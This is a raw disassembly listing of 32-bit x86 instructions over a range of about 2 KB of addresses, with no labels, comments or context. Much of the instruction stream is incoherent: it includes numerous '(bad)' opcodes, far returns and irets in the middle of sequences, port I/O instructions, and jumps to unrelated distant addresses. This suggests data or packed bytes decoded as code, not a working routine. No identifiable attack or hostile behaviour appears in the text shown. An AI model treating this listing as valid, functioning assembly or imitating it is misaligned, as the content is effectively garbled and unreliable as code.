  430487:	fsub   st,st(4)
  430489:	ret    
  43048a:	loopne 0x430427
  43048c:	xor    DWORD PTR [edx],0x31
  43048f:	cmp    edi,edi
  430491:	bswap  eax
  430493:	rol    BYTE PTR gs:[eax],0x5
  430497:	jmp    0x12e05e1
  43049c:	mov    eax,DWORD PTR [ebp-0x4]
  43049f:	add    BYTE PTR [eax+0xff0100],bh
  4304a5:	cld    
  4304a6:	jne    0x430525
  4304a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4304ae:	jb     0x4304b1
  4304b0:	add    BYTE PTR [eax],al
  4304b2:	push   eax
  4304b3:	fild   DWORD PTR [ebp+0x0]
  4304b6:	mov    edx,DWORD PTR [eax-0x68]
  4304b9:	inc    ebp
  4304ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4304c0:	or     bh,bh
  4304c2:	inc    ebp
  4304c3:	call   0x1272bc7
  4304c8:	jge    0x430517
  4304ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4304d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4304d6:	fwait
  4304d7:	mov    eax,0x30132
  4304dc:	lea    esi,[ebp+0x2c]
  4304df:	xor    edi,edi
  4304e1:	(bad)  
  4304e2:	call   0x1422e4f
  4304e7:	call   0x1372e77
  4304ec:	jne    0x430479
  4304ee:	xor    edi,esp
  4304f0:	add    eax,DWORD PTR [eax+0xc018d]
  4304f6:	push   DWORD PTR [eax]
  4304f8:	call   0xcc2e54
  4304fd:	enter  0x45ff,0xe0
  430501:	mov    ecx,DWORD PTR [ebp-0x28]
  430504:	xor    eax,DWORD PTR [eax]
  430506:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43050c:	(bad)  
  43050d:	xchg   ebp,eax
  43050e:	call   0x1420612
  430513:	mov    cl,0x45
  430515:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43051b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430522:	mov    edi,edi
  430524:	or     BYTE PTR [eax],cl
  430526:	inc    ebp
  430527:	test   DWORD PTR gs:[eax],eax
  43052a:	je     0x430571
  43052c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430532:	xor    edx,DWORD PTR [eax-0x73]
  430535:	push   ebp
  430536:	or     BYTE PTR [ebp+0x21007572],al
  43053c:	inc    ebp
  43053d:	loopne 0x4304ca
  43053f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430546:	int    0x0
  430548:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43054e:	inc    ebp
  43054f:	push   ebp
  430550:	cmp    ebp,eax
  430552:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430559:	cld    
  43055a:	fadd   QWORD PTR [eax+0x3b014d]
  430560:	jne    0x430592
  430562:	push   0xf8898557
  430567:	loopne 0x4305de
  430569:	inc    ebp
  43056a:	lea    eax,[ebx+0x72e8e4cc]
  430570:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430576:	jmp    0x4305ab
  430578:	mov    edi,DWORD PTR [edi+0x4572bc]
  43057e:	xor    eax,edi
  430580:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43058a:	rcl    BYTE PTR [eax-0x40],1
  43058d:	inc    ebp
  43058e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430596:	inc    ebp
  430597:	xchg   ebp,eax
  430598:	ud0    ebp,DWORD PTR [ebx]
  43059b:	inc    DWORD PTR [eax]
  43059d:	daa    
  43059e:	jbe    0x4305a0
  4305a0:	mov    dl,BYTE PTR [eax-0x80]
  4305a3:	push   ebp
  4305a4:	pop    ds
  4305a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4305a8:	inc    eax
  4305a9:	retf   
  4305aa:	inc    ebp
  4305ab:	iret   
  4305ac:	jb     0x430576
  4305ae:	mov    eax,DWORD PTR [edi]
  4305b0:	int3   
  4305b1:	inc    ebp
  4305b2:	inc    ebp
  4305b3:	add    DWORD PTR [ecx],esi
  4305b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4305bc:	xor    dh,BYTE PTR [ebx]
  4305be:	pushf  
  4305bf:	lea    ecx,[ecx+0x4d72d808]
  4305c5:	add    BYTE PTR [ebx],dh
  4305c7:	inc    ebp
  4305c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4305ce:	xor    dl,BYTE PTR [edx]
  4305d0:	add    eax,DWORD PTR [ebp-0x77]
  4305d3:	mov    eax,esp
  4305d5:	fmul   QWORD PTR [ebp-0x3d]
  4305d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4305df:	mov    DWORD PTR [ebp-0x24],eax
  4305e2:	rol    DWORD PTR [ebp-0x64],1
  4305e5:	xor    eax,edi
  4305e7:	mov    ecx,0xff858db0
  4305ec:	clc    
  4305ed:	enter  0x4d45,0x3c
  4305f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4305f8:	test   esi,edi
  4305fa:	clc    
  4305fb:	inc    DWORD PTR [ebp+0x45]
  4305fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430606:	test   DWORD PTR [ecx],esi
  430608:	clc    
  430609:	pushf  
  43060a:	inc    ebp
  43060b:	(bad)  
  43060c:	cmp    ah,bh
  43060e:	pushf  
  43060f:	inc    ebp
  430610:	mov    edx,DWORD PTR [eax-0x24]
  430613:	add    BYTE PTR [ebp+0x0],dl
  430616:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43061c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430620:	add    al,dl
  430622:	jmp    0x10407f2
  430627:	jb     0x430676
  430629:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43062f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430632:	xor    ecx,DWORD PTR [edi]
  430634:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430638:	(bad)  
  43063a:	clc    
  43063b:	int3   
  43063c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430643:	push   cs
  430644:	xor    ecx,eax
  430646:	xor    esp,ecx
  430648:	add    ebp,DWORD PTR [eax]
  43064a:	add    esi,DWORD PTR [eax]
  43064c:	(bad)  
  43064e:	retf   0x55cc
  430651:	repnz mov eax,DWORD PTR [ebp-0x10]
  430655:	(bad)  
  430656:	cli    
  430657:	fdiv   st(1),st
  430659:	test   DWORD PTR [eax+edi*8],ecx
  43065c:	dec    ebp
  43065d:	inc    ebp
  43065e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430664:	add    BYTE PTR [ebp+0x0],al
  430667:	mov    ecx,DWORD PTR [ebp-0x24]
  43066a:	mov    ecx,ebx
  43066c:	clc    
  43066d:	jne    0x43063a
  43066f:	mov    esi,0xd672d3
  430674:	into   
  430675:	into   
  430676:	scas   eax,DWORD PTR es:[edi]
  430677:	dec    ebp
  430678:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43067e:	sub    ecx,esi
  430680:	cmp    ecx,DWORD PTR [ebp+0x77]
  430683:	(bad)  
  430684:	mov    edi,eax
  430686:	mov    al,0x85
  430688:	mov    eax,edi
  43068a:	add    BYTE PTR [ebp-0x75],al
  43068d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430694:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43069a:	(bad)  
  43069c:	retf   0x559c
  43069f:	(bad)  
  4306a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4306a7:	inc    ebp
  4306a8:	add    eax,0xeb9c4d3f
  4306ad:	(bad)  
  4306ae:	mov    ecx,eax
  4306b0:	lods   al,BYTE PTR ds:[esi]
  4306b1:	test   DWORD PTR [ebp-0x8],edx
  4306b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4306b7:	mov    eax,DWORD PTR [ebx]
  4306b9:	lock add ecx,ebx
  4306bc:	bswap  esi
  4306be:	retf   0x55d1
  4306c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4306c7:	jmp    0x4306c2
  4306c9:	add    BYTE PTR ds:0xebc44d8b,al
  4306cf:	push   ebp
  4306d0:	mov    ebp,DWORD PTR [ebx]
  4306d2:	test   al,0x8b
  4306d4:	push   ebp
  4306d5:	clc    
  4306d6:	xor    ecx,ebx
  4306d8:	xor    ecx,esi
  4306da:	add    edx,ecx
  4306dc:	add    eax,DWORD PTR [edx+0xca010f]
  4306e2:	push   ebp
  4306e3:	dec    ebp
  4306e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4306ea:	stc    
  4306eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4306f1:	scas   eax,DWORD PTR es:[edi]
  4306f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4306f8:	xor    ebp,DWORD PTR [ebx]
  4306fa:	xor    edi,DWORD PTR [ebx]
  4306fc:	add    esi,DWORD PTR [edi+0x3]
  4306ff:	mov    ecx,DWORD PTR [edi]
  430701:	clc    
  430702:	retf   0x55cb
  430705:	into   
  430706:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43070d:	mov    eax,0x3376554d
  430712:	mov    esi,DWORD PTR [ebx]
  430714:	enter  0x5503,0x3
  430718:	xor    ecx,DWORD PTR [edi]
  43071a:	xor    ecx,edx
  43071c:	add    edx,DWORD PTR [ebp+0x3]
  43071f:	mov    ecx,DWORD PTR [edi]
  430721:	lock retf 0x4dfa
  430725:	stc    
  430726:	mov    ecx,DWORD PTR [eax]
  430728:	or     BYTE PTR [ebp+0x4d],cl
  43072b:	jmp    0x10707bb
  430730:	dec    ebp
  430731:	dec    ebp
  430732:	(bad)  
  430733:	mov    esp,esp
  430735:	clc    
  430736:	test   ebx,ecx
  430738:	clc    
  430739:	ror    DWORD PTR [ebp-0x2a],cl
  43073c:	mov    esi,ecx
  43073e:	in     al,dx
  43073f:	scas   eax,DWORD PTR es:[edi]
  430740:	inc    ebp
  430741:	mov    esi,DWORD PTR [ebx]
  430743:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43074a:	retf   
  43074b:	ja     0x43071b
  43074d:	mov    ebp,DWORD PTR [eax-0x48]
  430750:	dec    ebp
  430751:	xor    ecx,DWORD PTR [di+0x3]
  430755:	mov    ebp,eax
  430757:	clc    
  430758:	push   ebp
  430759:	retf   
  43075a:	mov    dl,bl
  43075c:	adc    esi,edx
  43075e:	jb     0x43072e
  430760:	add    BYTE PTR [edi-0x3b7474b3],ch
  430766:	in     al,dx
  430767:	jge    0x430734
  430769:	sub    ecx,DWORD PTR [ebp+0x3b]
  43076c:	mov    esi,DWORD PTR [edi-0x24]
  43076f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430776:	mov    BYTE PTR [ebx-0x34b20729],cl
  43077c:	mov    edx,ebx
  43077e:	in     al,dx
  43077f:	(bad)  
  430780:	ror    esi,cl
  430782:	push   ebp
  430783:	scas   eax,DWORD PTR es:[edi]
  430784:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43078a:	fwait
  43078b:	sub    esi,DWORD PTR [edx]
  43078d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430793:	lods   al,BYTE PTR ds:[esi]
  430794:	xor    esp,DWORD PTR [ebx]
  430796:	add    ecx,DWORD PTR [ebp-0x18]
  430799:	mov    edi,DWORD PTR [ebp-0x8]
  43079c:	mov    bl,cl
  43079e:	cmp    dl,bl
  4307a0:	jb     0x430770
  4307a2:	add    dh,dl
  4307a4:	dec    ebp
  4307a5:	scas   eax,DWORD PTR es:[edi]
  4307a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4307ac:	shr    DWORD PTR [ebx],cl
  4307ae:	into   
  4307af:	cmp    edx,esi
  4307b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4307b7:	dec    ebp
  4307b8:	dec    ebp
  4307b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4307bf:	retf   
  4307c0:	xor    edx,esi
  4307c2:	add    ecx,esi
  4307c4:	imul   ecx,edx
  4307c7:	mov    DWORD PTR [ebp+0x8],edx
  4307ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4307cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4307d3:	add    esi,DWORD PTR [ebx]
  4307d5:	mov    ah,0x3
  4307d7:	inc    ebp
  4307d8:	rdtsc  
  4307da:	xlat   BYTE PTR ds:[ebx]
  4307db:	pushf  
  4307dc:	jge    0x430767
  4307de:	xor    ebx,esp
  4307e0:	sub    eax,DWORD PTR [ebp-0x73]
  4307e3:	(bad)  
  4307e4:	cmp    al,al
  4307e6:	jb     0x43076d
  4307e8:	add    al,bh
  4307ea:	ror    DWORD PTR [ebp-0x7a],1
  4307ed:	xor    edi,edi
  4307ef:	add    edi,edi
  4307f1:	jmp    0x430840
  4307f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4307f9:	dec    ebp
  4307fa:	into   
  4307fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430801:	fwait
  430802:	shl    DWORD PTR [edx],cl
  430804:	retf   0x5588
  430807:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43080d:	add    eax,DWORD PTR [eax]
  43080f:	call   0x8ace5d61
  430814:	fcom   DWORD PTR [ecx]
  430816:	retf   
  430817:	jb     0x43087e
  430819:	add    ch,cl
  43081b:	dec    ebp
  43081c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430822:	dec    ebp
  430823:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430829:	jge    0x4307f9
  43082b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430831:	add    cl,dh
  430833:	dec    ebp
  430834:	dec    DWORD PTR [ebx-0x2c031b75]
  43083a:	adc    BYTE PTR [ebp+0x1],0x8b
  43083e:	add    ah,bl
  430840:	jge    0x4307ce
  430842:	push   0xffffff9b
  430844:	push   0x8b3032
  430849:	shl    BYTE PTR [ebp+0x55],0x6a
  43084d:	xor    edi,edi
  43084f:	xor    edx,DWORD PTR [ebx+eax*1]
  430852:	inc    ebp
  430853:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430859:	dec    ebp
  43085a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430860:	jbe    0x4307ed
  430862:	mov    esp,eax
  430864:	ror    bl,1
  430866:	enter  0x14ce,0xaf
  43086a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430870:	push   ebp
  430871:	retf   0x5540
  430874:	push   ebp
  430875:	mov    esi,DWORD PTR [edx-0x18]
  430878:	mov    edx,ebx
  43087a:	cld    
  43087b:	(bad)  
  43087c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430883:	sti    
  430884:	add    dh,cl
  430886:	push   0xffffff94
  430888:	call   FWORD PTR [ebx+0x3b5032d0]
  43088e:	mov    ecx,DWORD PTR [edi]
  430890:	enter  0x455e,0xff
  430894:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43089a:	xor    esi,DWORD PTR [ebx]
  43089c:	mov    DWORD PTR [ebx],0xcace0f9c
  4308a2:	aas    
  4308a3:	push   ebp
  4308a4:	inc    ebp
  4308a5:	xor    edx,esi
  4308a7:	add    edx,esi
  4308a9:	mov    eax,DWORD PTR [ebx]
  4308ab:	(bad)  
  4308ac:	jmp    0x43083a
  4308ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4308b4:	rol    ah,1
  4308b6:	mov    esi,0xf133104d
  4308bb:	mov    edx,0xff388d80
  4308c0:	mov    dh,0xd1
  4308c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4308c5:	mov    eax,DWORD PTR [edx-0x28]
  4308c8:	add    BYTE PTR [ebp-0x75],bh
  4308cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4308d2:	fwait
  4308d3:	retf   0x8632
  4308d6:	cmp    ebp,0x8
  4308d9:	call   ebx
  4308db:	inc    ebp
  4308dc:	inc    ebp
  4308dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4308e3:	mov    esi,DWORD PTR [ecx]
  4308e5:	int3   
  4308e6:	pushf  
  4308e7:	add    al,0xc7
  4308e9:	add    al,al
  4308eb:	add    bl,al
  4308ed:	(bad)  
  4308ee:	clc    
  4308ef:	int3   
  4308f0:	inc    ebp
  4308f1:	add    BYTE PTR [ecx],dh
  4308f3:	push   eax
  4308f4:	pushf  
  4308f5:	mov    edi,eax
  4308f7:	enter  0xc008,0x85
  4308fb:	aas    
  4308fc:	clc    
  4308fd:	gs inc ebp
  4308ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430905:	push   ss
  430906:	xor    ecx,DWORD PTR [ebp+0x3]
  430909:	sub    edx,DWORD PTR [ecx-0x76]
  43090c:	dec    ebp
  43090d:	add    DWORD PTR [ebx+0x88d845],ecx
  430913:	mov    esi,DWORD PTR [ebx]
  430915:	or     BYTE PTR [ebx],al
  430917:	cmp    edx,DWORD PTR [ecx-0x34]
  43091a:	dec    ebp
  43091b:	out    dx,eax
  43091c:	xor    eax,DWORD PTR [ebp+0x3]
  43091f:	mov    edx,DWORD PTR [ecx-0x28]
  430922:	dec    ebp
  430923:	add    BYTE PTR [ebx],dh
  430925:	push   0x518003
  43092a:	push   eax
  43092b:	add    BYTE PTR [ebx-0x300748b],cl
  430931:	sbb    BYTE PTR [ebp+0x45],cl
  430934:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43093a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430940:	dec    ebp
  430941:	inc    ebp
  430942:	xor    edx,esi
  430944:	add    edx,esi
  430946:	push   ecx
  430947:	(bad)  
  430948:	dec    ebp
  430949:	mov    al,ds:0xc5d83dff
  43094e:	retf   
  43094f:	(bad)  
  430950:	into   
  430951:	sub    bh,bh
  430953:	dec    esp
  430954:	adc    al,0x9c
  430956:	inc    ebp
  430957:	push   ebp
  430958:	test   DWORD PTR [edi],ecx
  43095a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430961:	jmp    0xc9bc1875
  430966:	add    cl,dl
  430968:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430972:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430978:	rol    BYTE PTR [eax],0x54
  43097b:	clc    
  43097c:	gs jb  0x430986
  43097f:	mov    eax,DWORD PTR [ebp-0x30]
  430982:	xor    al,0x40
  430984:	sub    al,0xc7
  430986:	mov    al,ah
  430988:	add    DWORD PTR [ebp+0x4534f845],eax
  43098e:	sub    al,0x80
  430990:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430997:	mov    ch,0xff
  430999:	clc    
  43099a:	add    DWORD PTR [ebp+0x60],0x3d
  43099e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4309a5:	inc    ebp
  4309a6:	dec    DWORD PTR [ebx-0x3427f701]
  4309ac:	test   esi,ecx
  4309ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4309b4:	push   eax
  4309b5:	add    DWORD PTR [ebp+0x0],eax
  4309b8:	dec    ebx
  4309ba:	or     al,0xce
  4309bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4309c3:	into   
  4309c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4309ca:	mov    esi,ecx
  4309cc:	sar    bh,0x45
  4309cf:	adc    al,0x8b
  4309d1:	clc    
  4309d2:	fadd   DWORD PTR [ebp+0x0]
  4309d5:	mov    ebp,DWORD PTR [edx+0x8]
  4309d8:	push   edi
  4309d9:	adc    BYTE PTR [eax+0x1],0x83
  4309dd:	add    al,al
  4309df:	retf   
  4309e0:	mov    ecx,esi
  4309e2:	cld    
  4309e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4309e9:	into   
  4309ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4309f0:	jne    0x430a25
  4309f2:	inc    DWORD PTR [ebx]
  4309f4:	rcl    BYTE PTR [ecx+0x50],1
  4309f7:	push   eax
  4309f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4309fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430a05:	sar    bh,0x84
  430a08:	or     BYTE PTR [ebx],al
  430a0a:	push   eax
  430a0b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430a11:	pushf  
  430a12:	xor    edi,eax
  430a14:	pushf  
  430a15:	mov    ah,0x89
  430a17:	test   esp,ebp
  430a19:	clc    
  430a1a:	inc    ebp
  430a1b:	inc    ebp
  430a1c:	mov    DWORD PTR [eax+eax*8],esi
  430a1f:	sub    al,0x32
  430a21:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430a28:	dec    ebp
  430a29:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a2d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430a33:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a37:	or     DWORD PTR [ecx+0x45ff085c],0x0
  430a3e:	shl    DWORD PTR [ebp-0x380064],1
  430a44:	enter  0x858d,0x60
  430a48:	clc    
  430a49:	inc    DWORD PTR [ebp+0x50]
  430a4c:	cmp    al,0x75
  430a4e:	pushf  
  430a4f:	(bad)  
  430a50:	(bad)  
  430a51:	pop    esp
  430a52:	lods   al,BYTE PTR ds:[esi]
  430a53:	inc    DWORD PTR [ebp+0x4508f8ff]
  430a59:	mov    edi,DWORD PTR [esi]
  430a5b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430a62:	test   DWORD PTR [edi-0x8],edx
  430a65:	sbb    al,0x45
  430a67:	add    BYTE PTR [eax],bh
  430a69:	push   0x8b809c
  430a6e:	loopne 0x430ab5
  430a70:	push   ebp
  430a71:	mov    esi,DWORD PTR [ebx]
  430a73:	cld    
  430a74:	add    eax,DWORD PTR [eax+0xf013b]
  430a7a:	adc    al,0x0
  430a7c:	add    bh,bh
  430a7e:	jmp    0xc00b9b
  430a83:	add    BYTE PTR [ebp+0x45],cl
  430a86:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a8c:	dec    ebp
  430a8d:	push   0x38033
  430a92:	cmp    eax,DWORD PTR [eax]
  430a94:	unpcklps xmm7,xmm0
  430a97:	jne    0x430a99
  430a99:	dec    DWORD PTR [ebx+0x5545c818]
  430a9f:	mov    DWORD PTR [ebx],esi
  430aa1:	shl    BYTE PTR [ebx],1
  430aa3:	inc    ebp
  430aa4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430aaa:	retf   0x5575
  430aad:	dec    DWORD PTR [ebx-0x5ba13e8]
  430ab3:	(bad)  
  430ab4:	stc    
  430ab5:	loopne 0x430ac3
  430ab7:	test   DWORD PTR [ebp-0x8],ecx
  430aba:	xor    eax,DWORD PTR [ebp+0x3]
  430abd:	mov    ebp,ecx
  430abf:	rol    BYTE PTR [eax],1
  430ac1:	inc    ebp
  430ac2:	add    BYTE PTR [eax-0x7747ab3],bh
  430ac8:	clc    
  430ac9:	inc    ebp
  430aca:	retf   
  430acb:	mov    edx,ebx
  430acd:	loopne 0x430aa5
  430acf:	retf   
  430ad0:	into   
  430ad1:	into   
  430ad2:	scas   eax,DWORD PTR es:[edi]
  430ad3:	dec    ebp
  430ad4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430ada:	sub    ecx,esi
  430adc:	cmp    ecx,DWORD PTR [ebp+0x77]
  430adf:	(bad)  
  430ae0:	mov    edi,eax
  430ae2:	enter  0x8985,0xf8
  430ae6:	add    BYTE PTR [ebp-0x75],al
  430ae9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430af0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430af6:	(bad)  
  430af8:	retf   0x559c
  430afb:	(bad)  
  430afc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430b03:	inc    ebp
  430b04:	add    eax,0xeb9c4d3f
  430b09:	(bad)  
  430b0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430b10:	xor    ecx,DWORD PTR [ebp+0x33]
  430b13:	mov    eax,DWORD PTR [ebx]
  430b15:	in     al,dx
  430b16:	add    ecx,ebx
  430b18:	bswap  esi
  430b1a:	retf   0x55d1
  430b1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430b23:	jmp    0x430b1e
  430b25:	add    BYTE PTR ds:0xebf44d8b,al
  430b2b:	push   ebp
  430b2c:	mov    ebp,DWORD PTR [ebx]
  430b2e:	mov    eax,0x33f8558b
  430b33:	retf   
  430b34:	xor    ecx,esi
  430b36:	add    edx,ecx
  430b38:	add    eax,DWORD PTR [edx+0xca010f]
  430b3e:	push   ebp
  430b3f:	dec    ebp
  430b40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430b46:	stc    
  430b47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430b4d:	scas   eax,DWORD PTR es:[edi]
  430b4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430b54:	xor    ebp,DWORD PTR [ebx]
  430b56:	xor    edi,DWORD PTR [ebx]
  430b58:	add    esi,DWORD PTR [edi+0x3]
  430b5b:	mov    ecx,DWORD PTR [edi]
  430b5d:	clc    
  430b5e:	retf   0x55cb
  430b61:	into   
  430b62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430b69:	test   al,0x4d
  430b6b:	push   ebp
  430b6c:	jbe    0x430ba1
  430b6e:	mov    esi,DWORD PTR [ebx]
  430b70:	mov    al,0x3
  430b72:	push   ebp
  430b73:	add    esi,DWORD PTR [ebx]
  430b75:	rdpmc  
  430b77:	retf   0x5503
  430b7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b80:	dec    ebp
  430b81:	stc    
  430b82:	mov    ecx,DWORD PTR [eax]
  430b84:	or     BYTE PTR [ebp+0x4d],cl
  430b87:	jmp    0x1370c17
  430b8c:	dec    ebp
  430b8d:	dec    ebp
  430b8e:	(bad)  
  430b8f:	mov    esp,esp
  430b91:	clc    
  430b92:	test   ebx,ecx
  430b94:	clc    
  430b95:	ror    DWORD PTR [ebp-0x2a],cl
  430b98:	mov    esi,ecx
  430b9a:	lock scas eax,DWORD PTR es:[edi]
  430b9c:	inc    ebp
  430b9d:	mov    esi,DWORD PTR [ebx]
  430b9f:	hlt    
  430ba0:	pushf  
  430ba1:	jge    0x430b2e
  430ba3:	sub    esp,esp
  430ba5:	cmp    ecx,ebx
  430ba7:	ja     0x430b77
  430ba9:	mov    ebp,DWORD PTR [eax-0x58]
  430bac:	dec    ebp
  430bad:	xor    ecx,DWORD PTR [di+0x3]
  430bb1:	mov    ebp,eax
  430bb3:	clc    
  430bb4:	push   ebp
  430bb5:	retf   
  430bb6:	mov    dl,bl
  430bb8:	adc    esi,edx
  430bba:	jb     0x430b8a
  430bbc:	add    BYTE PTR [edi-0xb7474b3],ch
  430bc2:	lock jge 0x430b90
  430bc5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430bc8:	mov    esi,DWORD PTR [edi-0x28]
  430bcb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430bd2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430bd8:	mov    edx,ebx
  430bda:	lock (bad) 
  430bdc:	ror    esi,cl
  430bde:	push   ebp
  430bdf:	scas   eax,DWORD PTR es:[edi]
  430be0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430be6:	fwait
  430be7:	sub    esi,DWORD PTR [edx]
  430be9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf0:	xor    esp,DWORD PTR [ebx]
  430bf2:	add    ecx,DWORD PTR [ebp-0x18]
  430bf5:	mov    edi,DWORD PTR [ebp-0x8]
  430bf8:	mov    bl,cl
  430bfa:	cmp    dl,bl
  430bfc:	jb     0x430bcc
  430bfe:	add    dh,dl
  430c00:	dec    ebp
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430c08:	shr    DWORD PTR [ebx],cl
  430c0a:	into   
  430c0b:	cmp    edx,esi
  430c0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430c13:	dec    ebp
  430c14:	dec    ebp
  430c15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430c1b:	retf   
  430c1c:	xor    edx,esi
  430c1e:	add    ecx,esi
  430c20:	imul   ecx,edx
  430c23:	mov    DWORD PTR [ebp+0x8],edx
  430c26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430c29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430c2f:	add    esi,DWORD PTR [ebx]
  430c31:	rol    BYTE PTR [ebx],0x45
  430c34:	rdtsc  
  430c36:	xlat   BYTE PTR ds:[ebx]
  430c37:	pushf  
  430c38:	jge    0x430bc3
  430c3a:	xor    ebx,eax
  430c3c:	sub    eax,DWORD PTR [ebp-0x73]
  430c3f:	(bad)  
  430c40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430c47:	dec    ebp
  430c48:	xchg   BYTE PTR [ebx],dh
  430c4a:	inc    DWORD PTR [ebx]
  430c4c:	(bad)  
  430c4d:	jmp    0x430c9c
  430c4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430c55:	dec    ebp
  430c56:	into   
  430c57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430c5d:	fwait
  430c5e:	shl    DWORD PTR [edx],cl
  430c60:	retf   0x5588
  430c63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430c69:	add    eax,DWORD PTR [eax]
  430c6b:	call   0x8ace61bd
  430c70:	fcom   QWORD PTR [ecx]
  430c72:	retf   
  430c73:	jb     0x430cda
